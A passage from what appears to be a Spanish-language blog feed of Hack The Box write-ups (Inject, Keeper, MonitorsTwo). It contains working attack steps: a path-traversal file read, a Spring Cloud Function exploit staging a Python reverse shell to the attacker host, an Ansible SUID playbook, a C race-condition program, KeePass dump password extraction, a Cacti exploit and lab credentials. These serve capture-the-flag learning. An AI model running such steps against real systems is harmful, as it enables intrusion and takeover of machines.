&lt;p&gt;Parece que el archivo de imagen se carga dinámicamente desde el sistema de archivos utilizando el parámetro img. Veamos si podemos leer algún archivo fuera de nuestro directorio de trabajo como /etc/passwd.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
curl &quot;http://$rhost:8080/show_image?img=../../../../../../etc/passwd&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;root:.x:0:0:root:/root:/bin/bash
daemon:.x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:.x:2:2:bin:/bin:/usr/sbin/nologin
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Aparentemente podemos usar este endpoint para leer archivos locales usando un payload genérico de directory traversal. Trasteando un poco más, descubrimos que también podemos listar directorios.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
curl &quot;http://$rhost:8080/show_image?img=../../../../../../&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;bin
boot
dev
...
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Remote Code Execution&lt;/h3&gt;
&lt;p&gt;Encontremos el origen de la aplicación para poder buscar credenciales o una superficie de ataque adicional.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
inject_fetch() { curl -sm 1 &quot;http://$rhost:8080/show_image?img=&quot;$@; }
inject_fetch ../ # read parent directory
inject_fetch ../java # keep looking ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finalmente encontramos lo que parece ser la raíz del proyecto para la aplicación Java actual en ../../../{:.filepath}. Dentro de ese directorio, encontramos la configuración del proyecto Maven en pom.xml{:.filepath} que contiene un par de huellas de software notables.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;org.springframework.boot 2.6.5&lt;/li&gt;
&lt;li&gt;spring-cloud-function-web 3.2.2&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Si buscamos vulnerabilidades con cualquiera de las dos huellas, vemos referencias a un par de CVE diferentes. Confirmamos que Spring Cloud Function versión 3.2.2 es vulnerable a CVE-2022-22963 comprobando la descripción CVEDetails.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;En las versiones 3.1.6, 3.2.2 y versiones anteriores no compatibles de Spring Cloud Function, al utilizar la funcionalidad de enrutamiento es posible que un usuario proporcione un SpEL especialmente diseñado como expresión de enrutamiento que puede dar lugar a la ejecución remota de código y al acceso a recursos locales.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ya hay un número de exploits de prueba de concepto por ahí, pero decidí crear uno de todos modos aquí. Vamos a utilizar este programa para generar una shell inversa que responde a un oyente PwnCat.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
pwncat-cs -c &amp;lt;(echo &quot;listen -m linux -H $lhost 443&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
inject_fetch ../../../../../../usr/bin | grep &apos;^python&apos; # python3 is installed
tmp=$(mktemp -d)
cat &amp;lt;&amp;lt; EOF &amp;gt; $tmp/index.html
import os,pty,socket
s=socket.socket()
s.connect((&quot;$lhost&quot;,443))
[os.dup2(s.fileno(),f)for(f)in(0,1,2)]
pty.spawn(&quot;bash&quot;)
EOF
python3 -m http.server --bind $lhost --directory $tmp 80 &amp;amp;
python3 CVE-2022-22963.py &quot;http://$rhost:8080&quot; &quot;curl $lhost -o/tmp/_d&quot;
python3 CVE-2022-22963.py &quot;http://$rhost:8080&quot; &quot;python3 /tmp/_d&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A continuación, debemos obtener una devolución de llamada a nuestro oyente en el puerto 443 como el usuario franco.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;h3&gt;Frank&lt;/h3&gt;
&lt;p&gt;Empezaremos explorando el sistema de ficheros empezando por el directorio home de frank&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# frank@inject (bash)
find ~ -type f
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;/home/frank/.bashrc
/home/frank/.m2/settings.xml
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Hay un archivo de configuración de usuario Maven en ~/.m2/settings.xml{:.filepath} que contiene las credenciales para el usuario phil.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
  &amp;lt;servers&amp;gt;
    &amp;lt;server&amp;gt;
      &amp;lt;id&amp;gt;Inject&amp;lt;/id&amp;gt;
      &amp;lt;username&amp;gt;phil&amp;lt;/username&amp;gt;
      &amp;lt;password&amp;gt;DocPhillovestoInject123&amp;lt;/password&amp;gt;
      &amp;lt;privateKey&amp;gt;${user.home}/.ssh/id_dsa&amp;lt;/privateKey&amp;gt;
      &amp;lt;filePermissions&amp;gt;660&amp;lt;/filePermissions&amp;gt;
      &amp;lt;directoryPermissions&amp;gt;660&amp;lt;/directoryPermissions&amp;gt;
      &amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;
    &amp;lt;/server&amp;gt;
  &amp;lt;/servers&amp;gt;
&amp;lt;/settings&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Phil&lt;/h3&gt;
&lt;p&gt;Iniciaremos sesión como phil con su usando la contraseña DocPhillovestoInject123, tomaremos la bandera de usuario, luego ejecutaremos algunos comandos simples de enumeración.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
sudo -l # no luck :(
id # staff group?
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Con el comando id, descubre que phil es miembro de un grupo personalizado llamado staff. Veamos si este grupo tiene permisos especiales en el sistema de archivos.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
find / -group staff -ls 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;La entrada más notable es el directorio &lt;code&gt;/opt/automation/tasks{:.nolineno}&lt;/code&gt; que concede privilegios de escritura al grupo staff. Dentro de esa carpeta hay un archivo de configuración de sólo lectura (playbook) para un marco de automatización de TI conocido como Ansible. Dado que esto tiene que ver con la automatización, sospechamos que hay un trabajo CRON o algo similar que utiliza esta carpeta a ciertos intervalos. Usaremos PSpy para monitorizar procesos y encontrar tareas programadas.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (PwnCat phil@inject)
upload pspy /home/phil
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
chmod +x pspy &amp;amp;&amp;amp; ./pspy | tee -a pspy.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Después de un par de minutos, encontramos una serie de procesos privilegiados que se ejecutan cada dos minutos y que interactúan con &lt;code&gt;/opt/automation/tasks{:.filepath}&lt;/code&gt; de una manera potencialmente insegura.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml&lt;/li&gt;
&lt;li&gt;/usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml&lt;/li&gt;
&lt;li&gt;sleep 10&lt;/li&gt;
&lt;li&gt;/usr/bin/rm -rf /opt/automation/tasks/*&lt;/li&gt;
&lt;li&gt;/usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;El primer proceso en cuestión evalúa cualquier ruta que satisfaga /opt/automation/tasks/*.yml{:.filepath} como un playbook de Ansible. Deberíamos ser capaces de conseguir nuestro libro de jugadas evaluado desde /opt/automation/tasks{:.filepath} es escribible.&lt;/p&gt;
&lt;h3&gt;Ansible&lt;/h3&gt;
&lt;p&gt;Resulta que, la ejecución de comandos en un libro de jugadas Ansible es posible y bien documentado, lo que significa que debe ser capaz de escalar a la raíz de esta manera. Vamos a añadir una tarea que concederá el bit SUID a /bin/sh{:.filepath}, asegurándose de que limpiar después de nosotros mismos para no arruinar la caja para los demás.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- hosts: localhost
  tasks:
  - name: pwn
    ansible.builtin.shell: &quot;chmod +s /bin/sh&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
cat &amp;lt;&amp;lt; EOF &amp;gt; /opt/automation/tasks/pwnbook.yml
- hosts: localhost
  tasks:
  - name: pwn
    ansible.builtin.shell: chmod +s /bin/sh
EOF

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Después de un par de minutos verificamos que /bin/sh{:.filepath} o /bin/dash{:.filepath} tienen SUID, y luego generamos un shell de root.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
/bin/sh -pi
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Alternative Solution (Bonus)&lt;/h3&gt;
&lt;p&gt;Imaginemos que el comodín mágico utilizado para ejecutar nuestro propio libro de jugadas no existiera. Incluso sin esto, podemos resolver esta máquina abusando de una condición de carrera en un trabajo CRON. Mira, cada dos minutos root evalúa el playbook en /opt/automation/tasks/playbook_1.yml{:.filepath} junto con el siguiente comando:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sleep 10 &amp;amp;&amp;amp;
  rm -rf /opt/automation/tasks/* &amp;amp;&amp;amp;
  cp /root/playbook_1.yml /opt/automation/tasks/
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt; gantt
  dateFormat mm:ss
  axisFormat %M:%S
  tickInterval 2minute
  title Process creation flow
  section CRON Job
  Run playbook : crit, milestone, p1, 00:00, 0s
  Sleep : p2, 00:00, 10s
  Remove playbooks : milestone, p3, 00:10, 0s
  Copy original playbook to tasks folder : milestone, p4, 00:10, 0s
  CRON Wait : w, 00:00, 2m
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Si observamos la temporización de las llamadas en nuestro registro de PSpy, nos damos cuenta de que el libro de jugadas original se elimina y se sustituye en menos de un segundo. Resulta que podemos utilizar el tiempo entre estas acciones para evitar por completo que el playbook sea reemplazado. Para ello, creamos un directorio en /opt/automation/tasks/playbook_1.yml{:.filepath} mientras que la ruta no se reclama. Cuando la tarea intenta rellenar esa ruta, se encuentra con un error, ya que un archivo no puede sobrescribir un directorio, independientemente de los permisos que tenga. Una vez que el comando cp falla, eliminaremos el directorio y lo reemplazaremos con nuestro playbook malicioso, que se evaluará después de un par de minutos.&lt;/p&gt;
&lt;p&gt;Sólo necesitamos crear un programa compilado rápido que sea lo suficientemente eficiente para cronometrar esto correctamente. El siguiente programa debería funcionar bien:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// gcc -static ./privesc2.c -o privesc2
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

#define PLAYBOOK_PATH &quot;/opt/automation/tasks/playbook_1.yml&quot;
#define PLAYBOOK &quot;- hosts: localhost\n&quot;\
                 &quot;  tasks:\n&quot;\
                 &quot;  - name: pwn\n&quot;\
                 &quot;    ansible.builtin.shell: chmod +s /bin/sh\n&quot;

void replace() {
  struct stat sb;

  while(1) {
    if (stat(PLAYBOOK_PATH, &amp;amp;sb) != 0) {
      if (mkdir(PLAYBOOK_PATH, 0700) == 0) {
        puts(&quot;Swapped with directory!&quot;);
        return;
      }
      puts(&quot;Fail!&quot;);
      sleep(110);
    }
    usleep(100);
  }
}

void plant() {
  FILE *file;
  if (file = fopen(PLAYBOOK_PATH, &quot;w&quot;)) {
    fprintf(file, &quot;%s&quot;, PLAYBOOK);
    fclose(file);
  }
}

int main(int argc, char* argv[]) {
  replace();
  sleep(10);
  system(&quot;rm -rf /opt/automation/tasks/playbook_1.yml&quot;);
  plant();
  puts(&quot;Done!&quot;);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ejecutar el ejecutable compilado en el objetivo debería reemplazar el archivo con nuestro playbook malicioso después de un par de minutos. A continuación, esperamos otro par de minutos y ejecutamos /bin/sh -pi para generar un intérprete de comandos raíz.&lt;/p&gt;
</content:encoded></item><item><title>Keeper HTB Writeup</title><link>https://fuwari.vercel.app/posts/keeper/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/keeper/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Keeper es una máquina Easy del desafío Hack The Box. La enumeración comienza con un escaneo Nmap que revela servicios SSH y HTTP. El servicio HTTP ejecuta Request Tracker 4.4.4, conocido por una vulnerabilidad de divulgación de información a través de la enumeración de usuarios. Se encuentran credenciales por defecto para &apos;root&apos;. Al acceder al panel de administración se revela la contraseña de un usuario, «Welcome2023!».&lt;/p&gt;
&lt;p&gt;El uso de SSH con las credenciales encontradas permite el acceso a un sistema Ubuntu. Se descubre una base de datos Keepass y un volcado de programa, lo que permite recuperar la contraseña maestra «rødgrød med fløde» (postre danés), que da acceso a la base de datos Keepass. Se encuentra un archivo Putty PPK y se convierte en una clave RSA, lo que permite el acceso SSH como «root». Esta progresión da como resultado la finalización con éxito del desafío.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Verificamos nuestra conexión con la máquina, en caso de que no responda, Compruebe su archivo VPN:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ping -c 1 10.10.11.227                                            
PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data.
64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=140 ms

--- 10.10.11.227 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 140.045/140.045/140.045/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;comenzamos nuestro escaneo con nmap:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS --open -p- --min-rate 5000 -n -Pn -v 10.10.11.227 -oG nmapScan

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Realicemos un escaneo más profundo:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sVC -p22,80 10.10.11.227 -oN ports

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn&apos;t have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;Product&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;ssh&lt;/td&gt;
&lt;td&gt;OpenSSH&lt;/td&gt;
&lt;td&gt;8.9p1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;td&gt;nginx&lt;/td&gt;
&lt;td&gt;1.18.0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Por ahora no intentamos nada a través de ssh ya que no tenemos credenciales válidas, Así que vamos a ver el sitio web.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Default Credentials In Tracker&lt;/h3&gt;
&lt;p&gt;Al navegar a esta página nos encontramos con la siguiente página de inicio de sesión. Podemos ver que esta usando Request tracker Cuando busque en internet pude encontrar que las credenciales por defecto para la cuenta root es password Ingresando esta contraseña nos dio acceso a la aplicación web.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Al mirar a través de la aplicación podemos encontrar dos páginas interesantes. La primera es la página de tickets abiertos recientemente, que revela un problema que uno de los usuarios está teniendo. Dicen que tienen un crash dump en su directorio home para ayudar a los administradores a depurar sus problemas con keepass. Esta es información muy interesante que nos da un objetivo a seguir una vez que tengamos acceso al sistema.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;En segundo lugar al revisar el panel de usuarios de la aplicación pudimos ver que el mismo usuario que notamos antes en el ticket tenía una nota en su perfil. Esta nota mencionaba su contraseña de inicio por defecto. ¡Usando esta contraseña nos dio acceso a la máquina con ssh usando la contraseña Welcome2023!&lt;/p&gt;
&lt;h3&gt;SSH Credentials&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ssh lnorgaard@keeper.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;La carpeta de inicio contiene un archivo ZIP RT30000.zip. Este debe ser el archivo correspondiente al ticket que hemos visto antes. Transfiéralo a la máquina atacante y descomprímalo.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp
 extracting: passcodes.kdbx

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Obtenemos el crash dump de KeePass y un archivo de base de datos de KeePass.&lt;/p&gt;
&lt;h3&gt;Extracting the KeePass master password&lt;/h3&gt;
&lt;p&gt;Tal vez sea posible extraer la contraseña maestra del archivo de volcado. He intentado utilizar este script de Python para la tarea: Keepass Dump MasterKey&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; python3 poc.py -d /opt/ctf/htb/keeper/KeePassDumpFull.dmp
2023-08-12 21:35:47,517 [.] [main] Opened /opt/ctf/htb/keeper/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Hay algunos problemas con los caracteres especiales. Una búsqueda rápida en Google de dgrd med flde revela el nombre del plato danés: Rødgrød med fløde.&lt;/p&gt;
&lt;p&gt;Utilizaré la utilidad kpcli para interactuar con el archivo de base de datos KeePass que hemos saqueado.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; kpcli

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type &apos;help&apos; for a description of available commands.
Type &apos;help &amp;lt;command&amp;gt;&apos; for details on individual commands.

kpcli:/&amp;gt; open passcodes.kdbx
Provide the master password: ************************* #Rødgrød med fløde
Error opening file: Couldn&apos;t load the file passcodes.kdbx

Error(s) from File::KeePass:
The database key appears invalid or else the database is corrupt.

kpcli:/&amp;gt; open passcodes.kdbx
Provide the master password: ************************* #rødgrød med fløde
kpcli:/&amp;gt; ls
=== Groups ===
passcodes/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;¡Éxito! La contraseña maestra de la base de datos KeePass es rødgrød med fløde. Vamos a buscar algunas credenciales.&lt;/p&gt;
&lt;h3&gt;SSH Private Key for root&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;kpcli:/&amp;gt; ls *
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
kpcli:/&amp;gt; ls */*
/passcodes/eMail:

/passcodes/General:

/passcodes/Homebanking:

/passcodes/Internet:

/passcodes/Network:
=== Entries ===
0. keeper.htb (Ticketing Server)
1. Ticketing System

/passcodes/Recycle Bin:
=== Entries ===
2. Sample Entry                                               keepass.info
3. Sample Entry #2                          keepass.info/help/kb/testform.

/passcodes/Windows:
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;kpcli:/&amp;gt; cd /passcodes/Network
kpcli:/passcodes/Network&amp;gt; ls
=== Entries ===
0. keeper.htb (Ticketing Server)
1. Ticketing System
kpcli:/passcodes/Network&amp;gt; show -f 0

Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: &amp;lt;REDACTED&amp;gt;
  URL:
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       &amp;lt;REDACTED&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;¡Parece que tenemos una clave privada SSH raíz para PuTTY! Convirtámosla al formato aceptable para OpenSSH con puttygen:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;puttygen key.putty -O private-openssh -o id_rsa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Y utiliza la clave para SSH:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; ssh root@keeper.htb -i id_rsa
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>MonitorsTwo HTB Writeup</title><link>https://fuwari.vercel.app/posts/monitorstwo/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/monitorstwo/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Comprobamos la conexión con la máquina víctima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; ping -c 1 10.10.11.211 
PING 10.10.11.211 (10.10.11.211) 56(84) bytes of data.
64 bytes from 10.10.11.211: icmp_seq=1 ttl=63 time=264 ms

--- 10.10.11.211 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 263.775/263.775/263.775/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ejecutamos nuestro escaneo con nmap:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sS -p- --open --min-rate 2000 -Pn -n 10.10.11.211 -oG scan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 22:35 AST
Nmap scan report for 10.10.11.211
Host is up (0.088s latency).
Not shown: 61122 closed tcp ports (reset), 4411 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 37.45 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p22,80 -sVC 10.10.11.211                                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 22:37 AST
Nmap scan report for 10.10.11.211 (10.10.11.211)
Host is up (0.077s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Escaneé el sistema para la etapa de enumeración con nmap, dirb, traceroute, view page source, etc. pero nada útil. Después de comprobar el directorio donde dirb encontró el punto final &lt;code&gt;/document&lt;/code&gt;, pasar algún tiempo en él, pero nada cambia, a continuación, iniciar la comprobación de las vulnerabilidades de la interfaz web de cactus y aquí vamos.&lt;/p&gt;
&lt;h3&gt;Cacti CVE&lt;/h3&gt;
&lt;p&gt;https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Después de ver la forma correcta de utilizar el exploit, lo ejecutamos.&lt;/p&gt;
&lt;p&gt;Escuchamos en el puerto 443:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -nlvp 443
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; python3 CVE-2022-46169.py  -u http://10.10.11.211 --LHOST=10.10.14.29 --LPORT=443 
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;LinEnum&lt;/h3&gt;
&lt;p&gt;Ahora vamos a ver posibles formas de elevar privilegios, usaremos LinEnum para tener más información.&lt;/p&gt;
&lt;p&gt;En nuestro resultado encontramos esto:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Aprovechamos para elevar nuestro privilegio.&lt;/p&gt;
&lt;h3&gt;Binario capsh&lt;/h3&gt;
&lt;p&gt;Lo ejecutamos dentro del directorio /sbin/:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./capsh --gid=0 --uid=0 --
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;here you have more information about this –&amp;gt; capsh&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Parece que estamos en un contenedor docker, así que vamos a intentar ver el contenido de una base de datos que encontramos antes:&lt;/p&gt;
&lt;h3&gt;Run Mysql to find credentials&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;mysql --host=db --user=root --password=root cacti -e &quot;SELECT * FROM user_auth&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;En el usuario marcus tenemos un hash, usaremos john para ver cual es.&lt;/p&gt;
&lt;h3&gt;Cracking Password con john&lt;/h3&gt;
&lt;p&gt;Lo guardamos en un archivo h.txt y lo ejecutamos:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;john h.txt --wordlist=/usr/share/wordlists/rockyou.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;SSH Conect&lt;/h3&gt;
&lt;p&gt;Nos conectamos a través de SSH&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh marcus@10.10.11.211
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Tras ejecutar LinEnum de nuevo, vemos que la máquina aloja un docker:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;marcus@monitorstwo:~$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;CVE-2021-41091&lt;/h3&gt;
&lt;p&gt;Después de buscar en Internet hemos encontrado un exploit. CVE-2021-41091&lt;/p&gt;
&lt;p&gt;Pasamos el exploit a nuestra máquina víctima.&lt;/p&gt;
&lt;p&gt;Vamos al contenedor docker que previamente teníamos como root:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd /bin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Asignamos estos permisos a bash.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chmod u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;
